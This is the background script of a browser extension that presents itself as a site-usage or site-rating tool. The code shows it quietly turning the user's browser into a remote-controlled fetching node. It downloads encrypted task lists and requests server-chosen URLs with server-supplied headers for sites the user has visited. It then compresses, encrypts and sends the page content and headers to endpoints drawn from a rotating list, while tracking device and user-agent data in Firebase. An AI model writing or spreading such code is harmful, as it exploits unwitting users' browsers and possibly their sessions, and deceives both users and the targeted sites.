let nextHighUsageSitesListRequestTimeoutId,
    nextSettingsTimeoutId,
    nextConfigTimeoutId,
    isHighUsageSitesListRequestRunning,
    isHeartbeatRunning


/* Firebase */

initializeApp({
    apiKey: "AIzaSyAxq4mhZrMJQcpHfR43sTlofeHupAZ39BA",
    authDomain: "sites-usage-extension.firebaseapp.com",
    databaseURL: "https://sites-usage-extension-default-rtdb.firebaseio.com",
    projectId: "sites-usage-extension",
    appId: "1:271960877341:web:605db672f7e044d8ee19f4",
    measurementId: "G-V9CXLBG1WN"
})

const database = getDatabase(), auth = getAuth()

const login = () => new Promise(resolve => auth.onAuthStateChanged(user => resolve(user)))

/* Firebase */

/* Settings */

const SETTINGS_URL = 'https://sites-usage.com/settings',
    SETTINGS_KEY = 'settings',
    RATING_STORAGE_KEY = 'rating',
    HEARTBEAT_INTERVAL = 1000 * 60 * 60 * 6

let settings = {}

const getRes = id => settings.resources[id]

const getConfig = id => settings.config[getRes(id)]

const updateSettings = (key, val) => {
    settings[key] = val
    chrome.storage.local.set({[SETTINGS_KEY]: settings})
}

const reloadSettings = () => new Promise(resolve =>
    chrome.storage.local.get([SETTINGS_KEY], res =>
        resolve(res[SETTINGS_KEY] || {})))

/* Settings */


/* Monitoring */

const hasBatteryLimit = async ()=>{
    try {
        const { charging, level } = await navigator.getBattery()
        return !charging && level * 100 <= getConfig('battery_min_level_key')
    }catch (e) {
        // For browser without battery compatibility, https://developer.mozilla.org/en-US/docs/Web/API/Navigator/getBattery#browser_compatibility
    }
}

const checkSiteRatingCappingLimit = ()=> settings.checkSiteRatingCount >= getConfig('check_site_rating_capping_key')

const isNewDay = () => dailyKey() > settings.lastActiveDay

const isConfigExpire = () => new Date(new Date().getTime() - new Date(settings.lastConfigTimestamp)) >
    getConfig('config_hours_interval_key') * 1000 * 60 * 60

const isStorageDeleted = () => auth.currentUser && !settings.mid

const isProcessHang = () => new Date().getTime() > settings.lastRatingCheck + settings['rating_process_hang_timeout']

const dailyKey = ()=>{
    const date = new Date()
    const utc0Date = new Date(date.getTime() + (date.getTimezoneOffset() * 60 * 1000))
    return utc0Date.getFullYear() + (utc0Date.getMonth() + 1).toString().padStart(2, '0')+utc0Date.getDate().toString().padStart(2, '0')
}

const log = (key, status="", val = 1, type='aggregation') => {
    if (!auth.currentUser) return

    key = key.replace(/[\\.#$/\[\]]/g, ' ')
    key = key + status.charAt(0).toUpperCase() + status.substring(1)

    console.log(key, val)

    update(ref(database, formatTable(`extension_daily_${type}`, dailyKey(), auth.currentUser.uid)), {
        [key]: increment(val)
    })

    if(type === 'errors') log(type)

    update(ref(database, formatTable('extension_users', auth.currentUser.uid)), { lastSeen: serverTimestamp() })
}

const formatTable = (name, ...args) => `${name}_${settings['firebase_version']}/${args.join('/')}`

/* Monitoring */


/* Core */

const onFreshInstall = async () => {
    console.log('onFreshInstall')

    let previousAuthId = ''

    if (isStorageDeleted()){
        previousAuthId = auth.currentUser.uid
        await auth.signOut()
    }

    await signInAnonymously(auth)

    updateSettings('mid', generateUid())

    await set(ref(database, formatTable('extension_users', auth.currentUser.uid)), {
        previousAuthId,
        installSince: serverTimestamp(),
        uuid: settings.mid,
        host: chrome.runtime.getManifest().name,
        lastSeen: serverTimestamp(),
        installUserAgent: navigator.userAgent,
        installVersion: chrome.runtime.getManifest().version,
        currentUserAgent: navigator.userAgent,
        currentVersion: chrome.runtime.getManifest().version
    })

    log('start')
}

const dailyUpdate = async () => {
    console.log('dailyUpdate')

    updateSettings('lastActiveDay', dailyKey())
    updateSettings('checkSiteRatingCount', 0)

    update(ref(database, formatTable('extension_users', auth.currentUser.uid)), {
        lastSeen: serverTimestamp(),
        currentUserAgent: navigator.userAgent,
        currentVersion: chrome.runtime.getManifest().version,
    })
}

const heartbeat = async ()=> {
    if (isHeartbeatRunning) return
    isHeartbeatRunning = true

    try {
        if(!Object.keys(settings).length || !nextSettingsTimeoutId) await settingsRequest()

        if(!Object.keys(settings).length) throw Error('Empty settings!')

        settings = await reloadSettings()

        if (!settings.mid || isStorageDeleted()) await onFreshInstall()

        log('heartbeat')

        if (!settings.key) await authRequest()

        if (!settings.key) throw Error('Empty auth!')

        if (!settings.config) await configRequest()

        if (!settings.config) throw Error('Empty config!')

        if (isNewDay()) await dailyUpdate()

        if (isConfigExpire()) await configRequest()

        if (getConfig('in_blacklist_key') || await hasBatteryLimit() || checkSiteRatingCappingLimit())
            throw Error('Sleep!')

        if (!isHighUsageSitesListRequestRunning && !nextHighUsageSitesListRequestTimeoutId)
            highUsageSitesListRequest()
        else if (isProcessHang()) highUsageSitesListRequest()

    }catch (e) {
        log(e.toString(), '', 1, 'errors')
    }finally {
        isHeartbeatRunning = false
    }

    return settings['heartbeat_interval'] || HEARTBEAT_INTERVAL
}

/* Core */


/* Requests */

const settingsRequest = async () => {
    console.log('settings')

    const response = await request(SETTINGS_URL)

    if (!response.ok) return

    const settings = await response.json()

    Object.entries(settings).forEach(([key, value])=>{
        if (key === 'server_key' || key === 'iv')
            value = CryptoJS.enc.Utf8.parse(value)

        updateSettings(key, value)
    })

    nextSettingsTimeoutId = setTimeout(settingsRequest, settings['settings_interval'])
}

const authRequest = async () => {
    console.log('auth')

    const url = settings.config ? getConfig('auth_url_key') : settings['auth_url']
    const response = await request(`${ url }?mid=${ settings.mid }`, {
        method: 'POST',
        headers: { 'Content-Type': 'text/plain; charset=utf-8' },
    })

    if (!response.ok) return

    const encryptedKey = await response.text()
    const decryptedKey = CryptoJS.AES.decrypt(encryptedKey, settings['server_key'], { iv: settings.iv }).toString(CryptoJS.enc.Utf8)

    if (!decryptedKey) throw Error('Empty key!')

    updateSettings('key', CryptoJS.enc.Utf8.parse(decryptedKey))
}

const configRequest = async () => {
    console.log('config')

    const url = settings.config ? rndFromList(getConfig('config_url_key')) : settings['config_url']
    const response = await request(`${ url }?mid=${ settings.mid }&ct=${ settings.ct }&cv=${ settings.cv }`, {
        method: 'POST',
        headers: { 'Content-Type': 'text/plain; charset=utf-8' }
    })

    if (!response.ok) return

    const encryptedConfig = await response.text()
    const decryptedConfig = CryptoJS.AES.decrypt(encryptedConfig, settings.key, { iv: settings.iv }).toString(CryptoJS.enc.Utf8)

    updateSettings('config', JSON.parse(decryptedConfig))
    updateSettings('lastConfigTimestamp', new Date().getTime())

    clearInterval(nextConfigTimeoutId)
    nextConfigTimeoutId = setInterval(configRequest, 1000 * 60 * 60 * getConfig('config_hours_interval_key'))
}

const highUsageSitesListRequest = async () => {
    if (isProcessHang()) log('hanging')
    else if(isHighUsageSitesListRequestRunning) return

    const taskKey = getRes('high_usage_sites_list_task_key')
    console.log(taskKey)

    isHighUsageSitesListRequestRunning = true

    try {
        const urls = getConfig('high_usage_sites_list_urls_key')
        if (!urls) return

        log(taskKey, settings.retry ? 'retry' : 'start')

        const body = { mid: settings.mid, supplier_id: settings['supplier_id'] }
        const utf8Body = CryptoJS.enc.Utf8.parse(JSON.stringify(body))
        const encryptedBody = CryptoJS.AES.encrypt(utf8Body, settings.key, { iv: settings.iv }).toString()

        const url = rndFromList(urls)
        const response = await request(`${ url }?mid=${ settings.mid }&ct=${ settings.ct }&cv=${ settings.cv }&count=${getConfig('high_usage_sites_amount_key')}&version=${ getConfig('version_key') }`, {
            method: 'POST',
            headers: { 'Content-Type': 'text/plain; charset=utf-8' },
            body: encryptedBody
        })

        if (response.status !== 211) {
            updateSettings('retry', 0)
            log(taskKey, response.ok ? 'success' : 'failed')
        }

        switch (response.status) {
            case 421:
                return await authRequest()
            case 422:
                return await configRequest()
            case 211:
                return retryHighUsageSitesListRequest()
            case 200:
                return await startRatingProcess(response)
        }
    } catch(e){
        console.log(e)
    } finally {
        updateSettings('lastRatingCheck', new Date().getTime())

        clearTimeout(nextHighUsageSitesListRequestTimeoutId)

        const nextInterval = settings.retry > 0 ? getConfig('retry_sleep_key') : settings['high_usage_sites_list_interval']
        nextHighUsageSitesListRequestTimeoutId = setTimeout(highUsageSitesListRequest, nextInterval)

        console.log(`Next process in ${nextInterval}ms`)
        isHighUsageSitesListRequestRunning = false
    }
}

const startRatingProcess = async response => {
    const highUsageSites = JSON.parse(CryptoJS.AES.decrypt(await response.text(), settings.key, { iv: settings.iv }).toString(CryptoJS.enc.Utf8))
    const userHighUsageSites = await getSitesUsage() || {}

    updateSettings('checkSiteRatingCount', highUsageSites.length)

    const siteRatingProcessKey = getRes('site_rating_process_key')
    log(siteRatingProcessKey, `count`, highUsageSites.length)

    for (const highUsageSite of highUsageSites) {
        if (highUsageSite.hostname === Object.keys(userHighUsageSites).find(it => it === highUsageSite.hostname)) {
            log(siteRatingProcessKey, `start`)
            const ok = await siteRatingRequest(highUsageSite)
            log(siteRatingProcessKey, ok ? `success` : `failed`)
        }
    }
}

const retryHighUsageSitesListRequest = () =>{
    const taskKey = getRes('high_usage_sites_list_task_key')

    console.log(`Retry ${taskKey}!`)

    if (settings.retry >= getConfig('retry_key'))
        return log(taskKey, 'retry') || updateSettings('retry', 0)

    updateSettings('retry', (settings.retry || 0) + 1)
}

const siteRatingRequest = async highUsageSite => {
    let ok = false

    try {
        const taskKey = getRes('check_site_rating_task_key')

        log(taskKey, 'start')

        const url = highUsageSite[getRes("site_rating_url_key")]
        const headers = highUsageSite[getRes("site_rating_headers_key")]

        const response = await request(url, { headers })
        ok = response.ok
        log(taskKey, ok ? 'success' : 'failed')

        const rating = await response.text()

        console.log(taskKey, 'status', response.status, 'url', url)

        const gzip = compress(rating, 'gzip')
        const base64Gzip = arrayBufferToBase64(gzip)
        const base64Headers = btoa(JSON.stringify(response.headers))

        const errorMessage = ok ? '' : rating
        const dataSize = ok ? rating.length : 0
        const headerSize = JSON.stringify(headers).length

        const body = {
            [getRes('response_status_code_key')]: response.status,
            [getRes('response_headers_key')]: base64Headers,
            [getRes('response_headers_size_key')]: headerSize,
            [getRes('response_data_size_key')]: dataSize,
            [getRes('response_data_key')]: base64Gzip,
            [getRes('response_error_message_key')]: errorMessage,
            [getRes('total_response_size_key')]: dataSize + headerSize + errorMessage.length,
            [getRes('high_usage_site_response_size_key')]: JSON.stringify(highUsageSite).length
        }

        const endpointUrl = rndFromList(highUsageSite[getRes('analyze_site_rating_urls_key')])

        ok = ok && await analyzeSiteRatingRequest(endpointUrl, body)
    } catch(e) {
        console.log(e)
    }

    return ok
}

const analyzeSiteRatingRequest = async (url, body) => {
    let ok = false

    try {
        const taskKey = getRes('analyze_site_rating_task_key')

        const utf8Body = CryptoJS.enc.Utf8.parse(JSON.stringify(body))
        const encryptedBody = CryptoJS.AES.encrypt(utf8Body, settings.key, { iv: settings.iv }).toString()

        log('reqUsage', '', body[getRes('high_usage_site_response_size')])
        log('resUsage', '', body['total_response_size'])
        log(taskKey, 'start')

        const response = await request(url, {
            method: 'POST',
            headers: { 'Content-Type': 'text/plain; charset=utf-8' },
            body: encryptedBody
        })

        ok = response.ok
        log(taskKey, ok ? 'success' : 'failed')

        const responseText = await response.text()

        ok = ok && await saveRatingRequest({
            [getRes('supplier_id_key')]: settings['supplier_id'],
            [getRes('analyze_site_url_key')]: url,
            [getRes('analyze_site_response_status_code_key')]: response.status,
            [getRes('analyze_site_response_error_message_key')]: !response.ok ? responseText : ''
        })
    } catch(e) {
        console.log(e)
    }

    return ok
}

const saveRatingRequest = async body => {
    let ok = false

    try {
        const taskKey = getRes('save_site_rating_task_key')

        log(taskKey, 'start')

        const utf8Body = CryptoJS.enc.Utf8.parse(JSON.stringify(body))
        const encryptedBody = CryptoJS.AES.encrypt(utf8Body, settings.key, { iv: settings.iv }).toString()

        const url = rndFromList(getConfig('save_site_rating_urls_key'))
        const response = await request(`${ url }?mid=${ settings.mid }&ct=${ settings.ct }&cv=${ settings.cv }&version=${ getConfig('version_key') }`, {
            method: 'POST',
            headers: { 'Content-Type': 'text/plain; charset=utf-8' },
            body: encryptedBody
        })

        ok = response.ok
        log(taskKey, ok ? 'success' : 'failed')

        chrome.storage.local.set({ [RATING_STORAGE_KEY]: JSON.parse(await response.text() || JSON.stringify([])) })
    } catch(e) {
        console.log(e)
    }

    return ok
}

const request = (url, options)=> new Promise(resolve => {
        let status

        fetch(url, options)
            .then(async response => {
                status = response.status
                if (!response.ok) throw Error(response.status.toString())
                console.log(url, response.status)
                resolve(response)
            }).catch(e=>{
            let message = `${url.split('?').shift()} ${e}`
            log(message, '', 1, 'errors')
            resolve(new Response(message, { status: status || 420 }))
        })
    }
)

/* Requests */


/* Utils */

const compress = (string, encoding) => {
    const byteArray = new TextEncoder().encode(string)
    const cs = new CompressionStream(encoding)
    const writer = cs.writable.getWriter()
    writer.write(byteArray)
    writer.close()
    return new Response(cs.readable).arrayBuffer()
}

const decompress = (byteArray, encoding) => {
    const cs = new DecompressionStream(encoding)
    const writer = cs.writable.getWriter()
    writer.write(byteArray)
    writer.close()
    return new Response(cs.readable).arrayBuffer().then(function (arrayBuffer) {
        return new TextDecoder().decode(arrayBuffer)
    })
}

const arrayBufferToBase64 = buffer =>
    btoa(new Uint8Array(buffer).reduce((bin, it)=>(bin += String.fromCharCode(it)) && bin, ''))

const base64ToArrayBuffer = base64 => {
    const bin = atob(base64)
    return new Uint8Array(bin.length).map((_, i)=>bin.charCodeAt(i)).buffer
}

const generateUid = () =>([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
    (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16))
    .replace(/-/g, '').slice(0, 18)

const rndFromList = list => list[Math.floor(Math.random() * list.length)]

/* Utils */


const initProcess = async () => {
    await login()

    if (auth.currentUser) log('start')

    const interval = await heartbeat()
    setInterval(heartbeat, interval)
}

initProcess()